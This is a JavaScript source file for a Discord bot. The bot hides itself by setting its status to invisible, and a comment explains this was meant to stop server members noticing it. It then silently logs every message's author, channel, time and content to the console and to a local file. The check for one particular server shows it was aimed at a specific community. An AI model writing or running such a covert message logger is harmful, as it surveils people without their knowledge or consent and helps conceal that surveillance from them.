const { Client, Intents, Guild } = require('discord.js');
const { token } = require("./config.json");
const fs = require("fs");
const logger = fs.createWriteStream("log.txt", {
    flags: "a"
});

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

client.once("ready", () => {
    const Guilds = client.guilds.cache.map(guild => guild.id);

    // This was to make sure they didn't spot the bot being online and to let it be buried deep in the member list, as if it was constantly going online and offline they might've found out what was up
    client.user.setStatus("invisible");

    console.log("--------------------------------------------------------");
	console.log(`Logged in as ${client.user.tag} at ${Date.now()}`);
    console.log("--------------------------------------------------------");
    console.log("Guilds:");
    for (let i = 0; i < Guilds.length; i++) {
        let currentGuild = client.guilds.cache.get(Guilds[i]);
        console.log("   - ", "\x1b[96m",currentGuild.name, "\x1b[0m");
        console.log(`      - ${currentGuild.id}`);
    }

    if (!Guilds.includes("895699090585825301")) {
        console.log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
        console.log("!!!NOT IN THE REMAINS OF WOW!!!");
        console.log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
    }
});

client.on("messageCreate", async message => {
    const Time = new Date().toLocaleString();
    console.log("\x1b[96m", message.author.username, "\x1b[0m" + " in ", "\x1b[96m" + "#" + message.channel.name, "\x1b[0m" + " at ", "\x1b[96m" + Time, "\x1b[0m");
    console.log(message.content);
    console.log("-----------------------------------------------------------------------------------------------------------");
    logger.write(message.author.username + " in #" + message.channel.name + " at " + Time + "\r\n");
    logger.write(message.content + "\r\n");
    logger.write("-----------------------------------------------------------------------------------------------------------\r\n");
});

client.login(token);